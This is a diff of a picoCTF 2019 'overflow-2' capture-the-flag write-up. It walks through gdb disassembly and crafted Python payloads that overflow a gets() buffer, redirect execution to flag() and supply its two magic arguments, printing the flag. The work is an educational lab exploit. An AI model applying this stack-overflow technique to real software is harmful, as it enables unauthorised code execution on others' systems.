@@ -83,173 +83,209 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault (core dumped)
 ```
 
-We need to invoke the `flag()` function like `flag(0xDEADBEEF, 0xC0DED00D)` from `vuln()`
+We need to invoke the `flag()` function like `flag(0xDEADBEEF, 0xC0DED00D)` from `vuln()`.
 
-The hint suggests to look at the stack, so let's do that.
-
-```bash
-samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
-... <redacted>
-Reading symbols from ./vuln...(no debugging symbols found)...done.
-(gdb) r
-Starting program: /problems/overflow-2/vuln 
-Please enter your string: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-Program received signal SIGSEGV, Segmentation fault.
-0x0804872a in main ()
-(gdb) info frame
-Stack level 0, frame at 0x1:
- eip = 0x804872a in main; saved eip = <not saved>
- Outermost frame: Cannot access memory at address 0xfffffffd
- Arglist at 0x41414141, args: 
- Locals at 0x41414141, Previous frame's sp is 0x1
-Cannot access memory at address 0xfffffffd
-```
-
-Notice how the `Arglist` is at `0x41414141`. Those are the `A`'s we passed in. So let's try a different string and see if we can figure out where in the list to enter our address and arguments.
-
-Let's try 176 `A`'s followed by the rest of the alphabet to see what ends up at the arg list.
-
-```
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
-```
+So let's first try to reproducce what we did in Overflow-1 and get into the `vuln()` function first.
 
 ```bash
 samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
 ... <redacted>
 Reading symbols from ./vuln...(no debugging symbols found)...done.
-(gdb) r
-Starting program: /problems/overflow-2/vuln 
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x08048676 <+0>:     push   %ebp
+   0x08048677 <+1>:     mov    %esp,%ebp
+   0x08048679 <+3>:     push   %ebx
+   0x0804867a <+4>:     sub    $0xb4,%esp
+   0x08048680 <+10>:    call   0x8048520 <__x86.get_pc_thunk.bx>
+   0x08048685 <+15>:    add    $0x197b,%ebx
+   0x0804868b <+21>:    sub    $0xc,%esp
+   0x0804868e <+24>:    lea    -0xb8(%ebp),%eax
+   0x08048694 <+30>:    push   %eax
+   0x08048695 <+31>:    call   0x8048430 <gets@plt>
+   0x0804869a <+36>:    add    $0x10,%esp
+   0x0804869d <+39>:    sub    $0xc,%esp
+   0x080486a0 <+42>:    lea    -0xb8(%ebp),%eax
+   0x080486a6 <+48>:    push   %eax
+   0x080486a7 <+49>:    call   0x8048460 <puts@plt>
+   0x080486ac <+54>:    add    $0x10,%esp
+   0x080486af <+57>:    nop
+   0x080486b0 <+58>:    mov    -0x4(%ebp),%ebx
+   0x080486b3 <+61>:    leave  
+   0x080486b4 <+62>:    ret    
+End of assembler dump.
+(gdb) b* 0x08048695
+Breakpoint 1 at 0x8048695
+(gdb) r < <(python -c 'print("A"*184)')
+Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*184)')
 Please enter your string: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 
-Program received signal SIGSEGV, Segmentation fault.
-0x45454545 in ?? ()
-(gdb) bt
-#0  0x45454545 in ?? ()
-#1  0x46464646 in ?? ()
-#2  0x47474747 in ?? ()
-#3  0x48484848 in ?? ()
-#4  0x49494949 in ?? ()
-#5  0x4a4a4a4a in ?? ()
-#6  0x4b4b4b4b in ?? ()
-#7  0x4c4c4c4c in ?? ()
-#8  0x4d4d4d4d in ?? ()
-#9  0x4e4e4e4e in ?? ()
-#10 0x4f4f4f4f in ?? ()
-#11 0x50505050 in ?? ()
-#12 0x51515151 in ?? ()
-#13 0x52525252 in ?? ()
-#14 0x53535353 in ?? ()
-#15 0x54545454 in ?? ()
-#16 0x55555555 in ?? ()
-#17 0x56565656 in ?? ()
-#18 0x57575757 in ?? ()
-#19 0x58585858 in ?? ()
-#20 0x59595959 in ?? ()
-#21 0x5a5a5a5a in ?? ()
-#22 0x00000000 in ?? ()
-(gdb) info frame
-Stack level 0, frame at 0xffada8e4:
- eip = 0x45454545; saved eip = 0x46464646
- called by frame at 0xffada8e8
- Arglist at 0xffada8dc, args: 
- Locals at 0xffada8dc, Previous frame's sp is 0xffada8e4
- Saved registers:
-  eip at 0xffada8e0
+Breakpoint 1, 0x08048695 in vuln ()
+(gdb) i f
+Stack level 0, frame at 0xffaacbb0:
+ eip = 0x8048695 in vuln; saved eip = 0x804871c
+(gdb) ni
+0x0804869a in vuln ()
+(gdb) i f
+Stack level 0, frame at 0xffaacbb0:
+ eip = 0x804869a in vuln; saved eip = 0x804871c
+(gdb) r < <(python -c 'print("A"*284)')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*284)')
+Please enter your string: 
+
+Breakpoint 1, 0x08048695 in vuln ()
+(gdb) i f
+Stack level 0, frame at 0xff894ed0:
+ eip = 0x8048695 in vuln; saved eip = 0x804871c
+(gdb) ni
+0x0804869a in vuln ()
+(gdb) i f
+Stack level 0, frame at 0xff894ed0:
+ eip = 0x804869a in vuln; saved eip = 0x41414141
+ called by frame at 0xff894ed4
+(gdb) x flag
+0x80485e6 <flag>:       0x53e58955
 ```
+
+Through a bunch of trial an error I finally found the input that lets us jump to the `flag()` function
+
+```bash
+(gdb) r < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
+Please enter your string: 
+
+Breakpoint 1, 0x08048695 in vuln ()
+(gdb) ni
+0x0804869a in vuln ()
+(gdb) info frame
+Stack level 0, frame at 0xff914d50:
+ eip = 0x804869a in vuln; saved eip = 0x80485e6
+(gdb) c
+Continuing.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
+[Inferior 1 (process 2898163) exited normally]
+```
+Perfect. We're in the `flag()` function as determined by the output, so let's dig into the function now.
 
 ```bash
 (gdb) disas flag
 Dump of assembler code for function flag:
    0x080485e6 <+0>:     push   %ebp
-... <redacted>
+   0x080485e7 <+1>:     mov    %esp,%ebp
+   0x080485e9 <+3>:     push   %ebx
+   0x080485ea <+4>:     sub    $0x54,%esp
+   0x080485ed <+7>:     call   0x8048520 <__x86.get_pc_thunk.bx>
+   0x080485f2 <+12>:    add    $0x1a0e,%ebx
+   0x080485f8 <+18>:    sub    $0x8,%esp
+   0x080485fb <+21>:    lea    -0x1850(%ebx),%eax
+   0x08048601 <+27>:    push   %eax
+   0x08048602 <+28>:    lea    -0x184e(%ebx),%eax
+   0x08048608 <+34>:    push   %eax
+   0x08048609 <+35>:    call   0x80484a0 <fopen@plt>
+   0x0804860e <+40>:    add    $0x10,%esp
+   0x08048611 <+43>:    mov    %eax,-0xc(%ebp)
+   0x08048614 <+46>:    cmpl   $0x0,-0xc(%ebp)
+   0x08048618 <+50>:    jne    0x8048636 <flag+80>
+   0x0804861a <+52>:    sub    $0xc,%esp
+   0x0804861d <+55>:    lea    -0x1844(%ebx),%eax
+   0x08048623 <+61>:    push   %eax
+   0x08048624 <+62>:    call   0x8048460 <puts@plt>
+   0x08048629 <+67>:    add    $0x10,%esp
+   0x0804862c <+70>:    sub    $0xc,%esp
+   0x0804862f <+73>:    push   $0x0
+   0x08048631 <+75>:    call   0x8048470 <exit@plt>
+   0x08048636 <+80>:    sub    $0x4,%esp
+   0x08048639 <+83>:    pushl  -0xc(%ebp)
+   0x0804863c <+86>:    push   $0x40
+   0x0804863e <+88>:    lea    -0x4c(%ebp),%eax
+   0x08048641 <+91>:    push   %eax
+   0x08048642 <+92>:    call   0x8048440 <fgets@plt>
+   0x08048647 <+97>:    add    $0x10,%esp
    0x0804864a <+100>:   cmpl   $0xdeadbeef,0x8(%ebp)
    0x08048651 <+107>:   jne    0x804866d <flag+135>
    0x08048653 <+109>:   cmpl   $0xc0ded00d,0xc(%ebp)
    0x0804865a <+116>:   jne    0x8048670 <flag+138>
-... <redacted>
+   0x0804865c <+118>:   sub    $0xc,%esp
+   0x0804865f <+121>:   lea    -0x4c(%ebp),%eax
+   0x08048662 <+124>:   push   %eax
+   0x08048663 <+125>:   call   0x8048420 <printf@plt>
+   0x08048668 <+130>:   add    $0x10,%esp
+   0x0804866b <+133>:   jmp    0x8048671 <flag+139>
+   0x0804866d <+135>:   nop
+   0x0804866e <+136>:   jmp    0x8048671 <flag+139>
+   0x08048670 <+138>:   nop
+   0x08048671 <+139>:   mov    -0x4(%ebp),%ebx
+   0x08048674 <+142>:   leave  
    0x08048675 <+143>:   ret    
 End of assembler dump.
 ```
 
-Intersting, we saw that it stopped at `0x45454545` which are the `DDDD`. So now we have 176 `A`'s, 12 bytes, `FLAG_ADDRESS`. So we could use:
+The lines that stand out the most to me are:
 
-```bash
-python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485e6)" | ./vuln
+```
+...
+cmpl   $0xdeadbeef,0x8(%ebp)
+...
+cmpl   $0xc0ded00d,0xc(%ebp)
+...
 ```
 
-Now the arguments `arg1` and `arg2` won't be far past the `FLAG_ADDRESS`. Let's determine where it needs to go.
+So what this is suggesting is that it's comparing the second and third values from the `ebp` register which is the bottom of the stack, so we should overwrite the return address, and add our first and second arguments to the stack
+
+So let's set some breakpoints there.
 
 ```bash
-samson@pico-2019-shell1:/problems/overflow-2$ python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH'" > /tmp/in
-samson@pico-2019-shell1:/problems/overflow-2$ gdb ./vuln
-... <redacted>
-Reading symbols from ./vuln...(no debugging symbols found)...done.
-(gdb) r < /tmp/in
-Starting program: /problems/overflow-2/vuln < /tmp/in
+(gdb) b* 0x0804864a
+Breakpoint 1 at 0x804864a
+(gdb) b* 0x08048653
+Breakpoint 2 at 0x8048653
+(gdb) r < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
+Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08")')
 Please enter your string: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
 Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.
-[Inferior 1 (process 2734491) exited normally]
+[Inferior 1 (process 2899300) exited normally]
 ```
 
-The program doesn't work because gdb isn't running under the same permissions. I'll copy the files over to another directory and attempt it
+Oh wait, in GDB the flag function exits first. So I guess we'll have to follow the hint... inspect the stack
+Let's append some input into it.
 
 ```bash
-samson@pico-2019-shell1:/problems/overflow-2$ mkdir /tmp/s5
-samson@pico-2019-shell1:/problems/overflow-2$ cp vuln /tmp/s5/vuln
-samson@pico-2019-shell1:/problems/overflow-2$ vi /tmp/s5/flag.txt
-samson@pico-2019-shell1:/problems/overflow-2$ cat /tmp/s5/flag.txt
-SAMCTF{123123123123123}
-samson@pico-2019-shell1:/problems/overflow-2$ pushd . && cd /tmp/s5
-samson@pico-2019-shell1:/tmp/s5$ gdb ./vuln
-... <redacted>
-Reading symbols from ./vuln...(no debugging symbols found)...done.
-(gdb) b *flag
+(gdb) b* 0x080485e6
 Breakpoint 1 at 0x80485e6
-(gdb) b *flag+97
-Breakpoint 2 at 0x8048647
-(gdb) r < /tmp/in
-Starting program: /tmp/s5/vuln < /tmp/in
+(gdb) r < <(python -c 'print("A"*188+"\xe6\x85\x04\x08"+"A"*8+"B"*8)')
+Starting program: /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446/vuln < <(python -c 'print("A"*188+"\xe6\x85\x04\x08"+"A"*8+"B"*8)')
 Please enter your string: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
 
 Breakpoint 1, 0x080485e6 in flag ()
-(gdb) c
-Continuing.
-
-Breakpoint 2, 0x08048647 in flag ()
 (gdb) info stack
-#0  0x08048647 in flag ()
+#0  0x080485e6 in flag ()
 #1  0x41414141 in ?? ()
-#2  0x42424242 in ?? ()
-#3  0x43434343 in ?? ()
-#4  0x44444444 in ?? ()
-#5  0x45454545 in ?? ()
-#6  0x46464646 in ?? ()
-#7  0x47474747 in ?? ()
-#8  0x48484848 in ?? ()
-#9  0xf7fbe000 in ?? () from /lib32/libc.so.6
+#2  0x41414141 in ?? ()
+#3  0x42424242 in ?? ()
+#4  0x42424242 in ?? ()
+#5  0xff8e7b00 in ?? ()
 Backtrace stopped: previous frame inner to this frame (corrupt stack?)
-(gdb) x $ebp
-0xffffd5ac:     0x42424242
 ```
 
-There it is. `ebp` is the first argument and from this [stackoverflow post](https://stackoverflow.com/questions/42771550/why-does-first-parameter-in-x86-assembly-starts-from-offset-8)
-We know the arguments are just 4 places off the flag adddress.
+So remember the stack grows from the EBP, so our first and second arguments are between `#1-#4`. However, the code seems to be looking at `ebp+8` so let's send `4 A's` before our arguments.
 
 ```bash
-samson@pico-2019-shell1:/tmp/s5$ popd
-/problems/overflow-2
-samson@pico-2019-shell1:/problems/overflow-2$ python -c "from pwn import *; print 'A'*176+'B'*12+p32(0x080485E6)+'A'*4+p32(0xDEADBEEF)+p32(0xC0DED00D)" | ./vuln 
+samson@pico-2019-shell1:/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446$ python -c 'print "A"*188+"\xe6\x85\x04\x08"+"A"*4+"\xef\xbe\xad\xde"+"\x0d\xd0\xde\xc0"' | ./vuln
 Please enter your string: 
-���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
 picoCTF{arg5_and_r3turn51b106031}Segmentation fault (core dumped)
 ```
+
+`r < <(python -c 'from pwn import *; print "A"*176+"B"*12+p32(0x080485E6)+"A"*4+p32(0xDEADBEEF)+p32(0xC0DED00D)')`
+
+Also works.
 
 ## Flag
 
